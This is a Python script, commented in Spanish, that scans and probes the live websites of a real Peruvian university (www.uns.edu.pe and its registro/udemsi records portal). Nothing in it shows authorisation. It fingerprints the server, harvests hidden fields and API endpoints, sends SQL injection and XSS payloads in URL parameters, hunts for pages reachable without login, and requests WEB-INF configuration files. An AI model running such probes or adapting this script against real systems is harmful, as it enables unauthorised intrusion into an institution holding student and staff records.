#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
EXPLORACION DE APLICACIONES - www.uns.edu.pe y registro.uns.edu.pe/udemsi/
"""
import requests
import urllib3
import re
import json
urllib3.disable_warnings()

print("=" * 70)
print("  EXPLORACION DE APLICACIONES")
print("  www.uns.edu.pe y registro.uns.edu.pe/udemsi/")
print("=" * 70)

# ============================================
# 1. Explorar www.uns.edu.pe
# ============================================
print("\n[1] Explorando www.uns.edu.pe")
print("-" * 50)

www = "https://www.uns.edu.pe"
s = requests.Session()
s.verify = False
s.headers.update({
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Accept': 'text/html,application/xhtml+xml',
})

# Access main page
r = s.get(www, timeout=10)
print(f"  Main page: HTTP {r.status_code}, len={len(r.text)}")
print(f"  Server: {r.headers.get('Server', 'N/A')}")
print(f"  Content-Type: {r.headers.get('Content-Type', 'N/A')}")

# Check for Angular/JSF
if 'ng-app' in r.text or 'angular' in r.text.lower():
    print(f"  [+] Angular JSF application detected")
if 'jsf' in r.text.lower() or 'faces' in r.text.lower():
    print(f"  [+] JSF detected")

# Check for common vulnerabilities in the HTML
# XSS testing
xss_vectors = ['<script>alert(1)</script>', '"><script>alert(1)</script>']
# Check if there are any user-controlled inputs reflected
# Look for any params in the URL
# Check for CSRF tokens
csrf_tokens = re.findall(r'(?:csrf|token|nonce)["\']?\s*[:=]\s*["\']([^"\']+)', r.text, re.IGNORECASE)
if csrf_tokens:
    print(f"  [+] CSRF tokens found: {csrf_tokens[:5]}")
else:
    print(f"  [-] No CSRF tokens found")

# Check for information disclosure
info_disclosure = re.findall(r'(?:DEBUG|TRACE|test|dev|local|localhost)[^"\']*', r.text, re.IGNORECASE)
if info_disclosure:
    print(f"  [+] Possible debug info: {info_disclosure[:5]}")

# Check for API endpoints
api_endpoints = re.findall(r'(?:/api/|/rest/|/ws/|/ajax/)[^"\']*', r.text, re.IGNORECASE)
if api_endpoints:
    print(f"  [+] API endpoints found: {api_endpoints[:10]}")

# Check for JavaScript files that might expose API
js_files = re.findall(r'src=["\']([^"\']*\.js[^"\']*)["\']', r.text)
print(f"  JavaScript files: {js_files[:10]}")

# Check for any form parameters
forms = re.findall(r'<form[^>]*name=["\']([^"\']+)["\']', r.text)
if forms:
    print(f"  Forms: {forms}")

# Look for any hidden parameters or config
hidden_params = re.findall(r'<input[^>]*type=["\']hidden["\'][^>]*name=["\']([^"\']+)["\'][^>]*value=["\']([^"\']*)["\']', r.text)
if hidden_params:
    print(f"  Hidden inputs: {hidden_params[:10]}")

# ============================================
# 2. Explorar www.uns.edu.pe/#/principal
# ============================================
print("\n\n[2] Explorando www.uns.edu.pe/#/principal")
print("-" * 50)

# The #/ route is client-side routing, server doesn't process it
# But the Angular/JSF app might have API endpoints

# Try to access the page with the hash
# Note: the # is not sent to the server, so we need to check the JavaScript
# for API endpoints

# Check the JavaScript files for API information
for js_file in js_files[:20]:
    if 'app' in js_file or 'main' in js_file or 'config' in js_file:
        try:
            # Get the full URL of the JS file
            if js_file.startswith('/'):
                js_url = f"{www}{js_file}"
            else:
                js_url = f"{www}/{js_file}"
            r = s.get(js_url, timeout=5)
            if r.status_code == 200 and len(r.text) > 100:
                # Look for API URLs
                api_urls = re.findall(r'["\'](?:/api/|/rest/|/ws/|/udemsi/)[^"\']*["\']', r.text)
                if api_urls:
                    print(f"  [+] API URLs in {js_file}: {api_urls[:10]}")
                # Look for configuration
                config_patterns = re.findall(r'(?:baseURL|apiUrl|endpoint|host)["\']?\s*[:=]\s*["\']([^"\']+)["\']', r.text, re.IGNORECASE)
                if config_patterns:
                    print(f"  [+] API config in {js_file}: {config_patterns}")
        except:
            pass

# ============================================
# 3. Explorar registro.uns.edu.pe/udemsi/
# ============================================
print("\n\n[3] Explorando registro.uns.edu.pe/udemsi/")
print("-" * 50)

registro = "https://registro.uns.edu.pe"
s2 = requests.Session()
s2.verify = False
s2.headers.update({
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Accept': 'text/html,application/xhtml+xml',
})

# Access udemsi
r = s2.get(f"{registro}/udemsi/", timeout=10)
print(f"  /udemsi/ : HTTP {r.status_code}, len={len(r.text)}")
print(f"  Server: {r.headers.get('Server', 'N/A')}")
print(f"  Content-Type: {r.headers.get('Content-Type', 'N/A')}")

# Check for JSF
if 'jsf' in r.text.lower() or 'faces' in r.text.lower():
    print(f"  [+] JSF detected")
if 'PrimeFaces' in r.text or 'primefaces' in r.text.lower():
    print(f"  [+] PrimeFaces detected")
if 'icefaces' in r.text.lower():
    print(f"  [+] IceFaces detected")

# Check for login form
if 'j_username' in r.text or 'j_password' in r.text:
    print(f"  [+] Java EE login form found")
if 'j_security_check' in r.text:
    print(f"  [+] j_security_check form found")

# Check for any error messages or debug info
if 'error' in r.text.lower() and 'stack' in r.text.lower():
    print(f"  [!] Stack trace exposed!")
if 'exception' in r.text.lower() and len(r.text) > 1000:
    print(f"  [!] Exception info exposed!")

# Check for CSRF tokens
csrf_in_udemsi = re.findall(r'(?:csrf|token|nonce|__csrf)["\']?\s*[:=]\s*["\']([^"\']+)', r.text, re.IGNORECASE)
if csrf_in_udemsi:
    print(f"  [+] CSRF tokens found in udemsi: {csrf_in_udemsi[:5]}")
else:
    print(f"  [-] No CSRF tokens found in udemsi")

# Check for view state (JSF)
view_state = re.findall(r'name=["\']javax\.faces\.viewstate["\'][^>]*value=["\']([^"\']+)["\']', r.text)
if view_state:
    print(f"  [+] JSF ViewState found (possible manipulation)")

# Check for hidden fields
hidden_fields = re.findall(r'<input[^>]*type=["\']hidden["\'][^>]*name=["\']([^"\']+)["\'][^>]*value=["\']([^"\']*)["\']', r.text)
if hidden_fields:
    print(f"  Hidden fields ({len(hidden_fields)}):")
    for name, val in hidden_fields[:15]:
        print(f"    {name} = {val[:50]}")

# Check for any parameters in the URL
# Try to access without login
if r.status_code == 200 and len(r.text) > 200:
    if 'login' not in r.text.lower():
        print(f"  [!] PAGINA ACCESIBLE SIN LOGIN!")
    else:
        print(f"  [+] Muestra login form")

# ============================================
# 4. Probar parámetros en udemsi
# ============================================
print("\n\n[4] Probando parámetros en /udemsi/")
print("-" * 50)

# Try different parameters
# JSF applications often use query parameters
param_tests = [
    f"{registro}/udemsi/?id=1",
    f"{registro}/udemsi/?id=1' OR 1=1 --",
    f"{registro}/udemsi/?codigo=1",
    f"{registro}/udemsi/?codigo=1' OR '1'='1",
    f"{registro}/udemsi/?anio=2024",
    f"{registro}/udemsi/?semestre=1",
    f"{registro}/udemsi/?docente=1",
    f"{registro}/udemsi/?estudiante=1",
    f"{registro}/udemsi/?materia=1",
    f"{registro}/udemsi/?nota=10",
]

for url in param_tests:
    try:
        r = s2.get(url, timeout=3)
        if r.status_code == 200 and len(r.text) > 100:
            # Check for SQL injection indicators
            sql_indicators = ['error', 'exception', 'mysql', 'sql', 'syntax']
            found = [ind for ind in sql_indicators if ind in r.text.lower() and len(r.text) < 500]
            if found:
                print(f"  [!] POSSIBLE SQLI: {url}")
                print(f"    Response: {r.text[:200]}")
            # Check for reflected input (XSS)
            elif 'id=1' in r.text or 'codigo=1' in r.text:
                print(f"  [+] Input reflected in response: {url}")
    except:
        pass

# ============================================
# 5. Probar rutas internas de udemsi
# ============================================
print("\n\n[5] Probando rutas internas de udemsi")
print("-" * 50)

udemsi_routes = [
    "/udemsi/faces/modulos.xhtml",
    "/udemsi/faces/modulos",
    "/udemsi/faces/principal.xhtml",
    "/udemsi/faces/index.xhtml",
    "/udemsi/faces/login.xhtml",
    "/udemsi/faces/j_security_check",
    "/udemsi/modulos.xhtml",
    "/udemsi/modulos",
    "/udemsi/principal.xhtml",
    "/udemsi/index.xhtml",
    "/udemsi/login.xhtml",
]

for route in udemsi_routes:
    try:
        r = s2.get(f"{registro}{route}", timeout=3)
        if r.status_code == 200 and len(r.text) > 100:
            has_login = 'j_username' in r.text or 'j_security_check' in r.text
            has_content = '<td' in r.text or 'form' in r.text.lower()
            print(f"  {route} -> HTTP {r.status_code} (len={len(r.text)}, login={has_login}, content={has_content})")
            if not has_login and has_content:
                print(f"  [!] ACCESIBLE SIN LOGIN!")
    except:
        pass

# ============================================
# 6. Verificar XSS en los parámetros
# ============================================
print("\n\n[6] Verificando XSS")
print("-" * 50)

xss_tests = [
    f"{registro}/udemsi/?nombre=<script>alert(1)</script>",
    f"{registro}/udemsi/?nombre=\"><script>alert(1)</script>",
    f"{registro}/udemsi/?nombre='><img src=x onerror=alert(1)>",
]

for url in xss_tests:
    try:
        r = s2.get(url, timeout=3)
        if r.status_code == 200 and len(r.text) > 100:
            # Check if the input is reflected without encoding
            if '<script>alert(1)</script>' in r.text:
                print(f"  [!] XSS CONFIRMADO: {url}")
                print(f"  [!] El script se refleja sin codificacion!")
            elif 'onerror=alert(1)' in r.text:
                print(f"  [!] XSS CONFIRMADO (onerror): {url}")
            elif '&lt;script&gt;' in r.text:
                print(f"  [+] Input codificado (no vulnerable)")
    except:
        pass

# ============================================
# 7. Verificar si hay archivos JSF config
# ============================================
print("\n\n[7] Buscando archivos de configuracion JSF")
print("-" * 50)

jsf_files = [
    "/udemsi/faces/config.xml",
    "/udemsi/WEB-INF/web.xml",
    "/udemsi/WEB-INF/faces-config.xml",
    "/udemsi/WEB-INF/classes/config.properties",
    "/udemsi/resources/config.properties",
]

for f in jsf_files:
    try:
        r = s2.get(f"{registro}{f}", timeout=3)
        if r.status_code == 200:
            print(f"  [!] ENCONTRADO: {f} -> HTTP {r.status_code} ({len(r.text)} bytes)")
            if len(r.text) > 0 and len(r.text) < 5000:
                print(f"  Content: {r.text[:300]}")
    except:
        pass

# ============================================
# 8. Verificar headers de seguridad
# ============================================
print("\n\n[8] Verificando headers de seguridad en udemsi")
print("-" * 50)

r = s2.get(f"{registro}/udemsi/", timeout=5)
security_headers = {
    'Strict-Transport-Security': 'HSTS',
    'Content-Security-Policy': 'CSP',
    'X-Frame-Options': 'Clickjacking',
    'X-Content-Type-Options': 'MIME sniffing',
    'X-Powered-By': 'Version disclosure',
}
for header, desc in security_headers.items():
    if header in r.headers:
        print(f"  {header}: {r.headers[header]} ({desc})")
    else:
        print(f"  {header}: [MISSING] ({desc})")

# Check for X-Frame-Options (clickjacking)
if 'X-Frame-Options' not in r.headers:
    print(f"\n  [!] CLICKJACKING VULNERABLE - No X-Frame-Options")
    # Try to embed the page
    print(f"  La pagina se puede embeder en iframes")

# Check for CSP (XSS protection)
if 'Content-Security-Policy' not in r.headers:
    print(f"  [!] XSS VULNERABLE - No Content-Security-Policy")

print("\n\n--- FIN ---")
